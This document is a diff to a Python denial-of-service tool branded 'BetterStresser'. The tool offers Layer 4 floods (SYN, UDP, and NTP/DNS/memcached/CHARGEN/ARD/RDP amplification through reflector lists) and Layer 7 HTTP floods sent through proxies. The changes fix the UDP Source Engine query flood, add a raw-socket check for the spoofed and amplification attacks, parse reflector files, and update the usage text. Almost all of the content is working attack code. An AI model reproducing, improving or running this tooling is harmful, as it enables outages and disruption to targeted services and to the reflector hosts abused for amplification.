@@ -42,9 +42,10 @@ __version__ = "2.0 SNAPSHOT"
 class Methods:
     LAYER7_METHODS: Set[str] = {"CFB", "BYPASS", "GET", "POST", "OVH", "STRESS",
                                 "DYN", "SLOW", "HEAD", "NULL", "COOKIE", "PPS",
-                                "EVEN", "GSB", "DGB", "AVB", "MINECRAFT"}
+                                "EVEN", "GSB", "DGB", "AVB"}
 
-    LAYER4_METHODS: Set[str] = {"TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "DNS", "ARD", "CHAR", "RDP"}
+    LAYER4_METHODS: Set[str] = {"TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM",
+                                "NTP", "DNS", "ARD", "CHAR", "RDP"}
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
 
@@ -202,7 +203,7 @@ class Layer4(Thread):
 
     def VSE(self) -> None:
         with suppress(TimeoutError), \
-                socket(AF_INET, SOCK_STREAM) as s:
+                socket(AF_INET, SOCK_DGRAM) as s:
             while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                             b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
                 continue
@@ -565,6 +566,13 @@ class ToolsConsole:
     METHODS = {"INFO", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}
 
     @staticmethod
+    def checkRawSocket():
+        with suppress(OSError):
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
+                return True
+        return False
+
+    @staticmethod
     def runConsole():
         cons = "%s@BetterStresser:~#" % gethostname()
 
@@ -733,7 +741,7 @@ class ToolsConsole:
                'Note: If You Don\'t Have a Proxy List, Script Won\'t Use Proxy\n'
                'If Proxy File doesn\'t exist, Script Will Download Proxy\n'
                ' Layer7: python3 %s <method> <url> <socks_type5.4.1> <threads> <proxylist> <rpc> <duration>\n'
-               ' Layer4: python3 %s <method> <ip:port> <threads> <rpc> <duration> <reflector file, (only use with Amplification>\n'
+               ' Layer4: python3 %s <method> <ip:port> <threads> <duration> <reflector file, (only use with Amplification>\n'
                '\n'
                ' > Methods:\n'
                ' - Layer4\n'
@@ -748,28 +756,27 @@ class ToolsConsole:
                '\n'
                'Example:\n'
                '    Layer7: python3 %s %s %s %s %s proxy.txt %s %s\n'
-               '    Layer4: python3 %s %s %s %s %s %s') % (argv[0], argv[0],
-                                                           ", ".join(Methods.LAYER4_METHODS),
-                                                           len(Methods.LAYER4_METHODS),
-                                                           ", ".join(Methods.LAYER7_METHODS),
-                                                           len(Methods.LAYER7_METHODS),
-                                                           ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
-                                                           ", ".join(["TOOLS", "HELP", "STOP"]), 3,
-                                                           len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
-                                                           argv[0],
-                                                           randchoice([*Methods.LAYER7_METHODS]),
-                                                           "https://example.com",
-                                                           randchoice([4, 5, 1]),
-                                                           randint(850, 1000),
-                                                           randint(50, 100),
-                                                           randint(1000, 3600),
-                                                           argv[0],
-                                                           randchoice([*Methods.LAYER4_METHODS]),
-                                                           "8.8.8.8:80",
-                                                           randint(850, 1000),
-                                                           randint(50, 100),
-                                                           randint(1000, 3600)
-                                                           ))
+               '    Layer4: python3 %s %s %s %s %s') % (argv[0], argv[0],
+                                                        ", ".join(Methods.LAYER4_METHODS),
+                                                        len(Methods.LAYER4_METHODS),
+                                                        ", ".join(Methods.LAYER7_METHODS),
+                                                        len(Methods.LAYER7_METHODS),
+                                                        ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
+                                                        ", ".join(["TOOLS", "HELP", "STOP"]), 3,
+                                                        len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
+                                                        argv[0],
+                                                        randchoice([*Methods.LAYER7_METHODS]),
+                                                        "https://example.com",
+                                                        randchoice([4, 5, 1]),
+                                                        randint(850, 1000),
+                                                        randint(50, 100),
+                                                        randint(1000, 3600),
+                                                        argv[0],
+                                                        randchoice([*Methods.LAYER4_METHODS]),
+                                                        "8.8.8.8:80",
+                                                        randint(850, 1000),
+                                                        randint(1000, 3600)
+                                                        ))
 
     # noinspection PyUnreachableCode
     @staticmethod
@@ -786,6 +793,7 @@ if __name__ == '__main__':
         with suppress(IndexError):
             one = argv[1].upper()
 
+            if one == "HELP": raise IndexError()
             if one == "TOOLS": ToolsConsole.runConsole()
             if one == "STOP": ToolsConsole.stop()
 
@@ -799,13 +807,15 @@ if __name__ == '__main__':
                 timer = int(argv[7])
                 proxy_ty = int(argv[3].strip())
                 proxy_li = Path(currentDir / "files/proxys/" / argv[5].strip())
+                useragent_li = Path(currentDir / "files/useragent.txt")
+                referers_li = Path(currentDir / "files/referers.txt")
                 proxies: Any = set()
 
-                if not Path(currentDir / "files/useragent.txt").exists(): exit("The Useragent file doesn't exist ")
-                if not Path(currentDir / "files/referers.txt").exists(): exit("The Referer file doesn't exist ")
+                if not useragent_li.exists(): exit("The Useragent file doesn't exist ")
+                if not referers_li.exists(): exit("The Referer file doesn't exist ")
 
-                uagents = set(a.strip() for a in open(currentDir / "files/useragent.txt", "r+").readlines())
-                referers = set(a.strip() for a in open(currentDir / "files/referers.txt", "r+").readlines())
+                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
+                referers = set(a.strip() for a in referers_li.open("r+").readlines())
 
                 if not uagents: exit("Empty Useragent File ")
                 if not referers: exit("Empty Referer File ")
@@ -814,16 +824,17 @@ if __name__ == '__main__':
                 if threads > 1000: print("WARNING! thread is higher than 1000")
                 if rpc > 100: print("WARNING! RPC (Request Pre Connection) is higher than 100")
 
-                if not Path(proxy_li).exists():
+                if not proxy_li.exists():
                     if rpc > 100: print("WARNING! The file doesn't exist, creating files and downloading proxies.")
-                    with open(proxy_li, "a+") as wr:
+                    proxy_li.mkdir(parents=True, exist_ok=True)
+                    with proxy_li.open("a+") as wr:
                         Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
                         Proxies = ProxyManager.checkAll(Proxies, url.human_repr(), threads)
 
                         for proxy in Proxies:
                             wr.write(proxy.__str__() + "\n")
 
-                with open(proxy_li, "r+") as rr:
+                with proxy_li.open("r+") as rr:
                     for pro in Regex.IPPort.findall(rr.read()):
                         proxies.add(Proxy(pro[0], int(pro[1]), proxy_ty))
 
@@ -850,12 +861,14 @@ if __name__ == '__main__':
                 if 65535 < port or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
                 if not Regex.IP.match(target): exit("Invalid Ip Selected")
 
-                if method in {"NTP", "DNS", "CHAR", "MEM"}:
-                    if len(argv) == 5:
-                        if not Path(currentDir / "files" / argv[5].strip()): exit(
-                            "The Reflector file doesn't exist ")
-                        ref = set(a.strip() for a in open(currentDir / "files" / argv[5].strip(), "r+").readlines())
+                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
+                        not ToolsConsole.checkRawSocket(): exit("Cannot Create Raw Socket ")
 
+                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
+                    if len(argv) == 6:
+                        refl_li = Path(currentDir / "files" / argv[5].strip())
+                        if not refl_li.exists(): exit("The Reflector file doesn't exist ")
+                        ref = set(a.strip() for a in Regex.IP.findall(refl_li.open("r+").read()))
                     if not ref: exit("Empty Reflector File ")
 
                 for _ in range(threads):
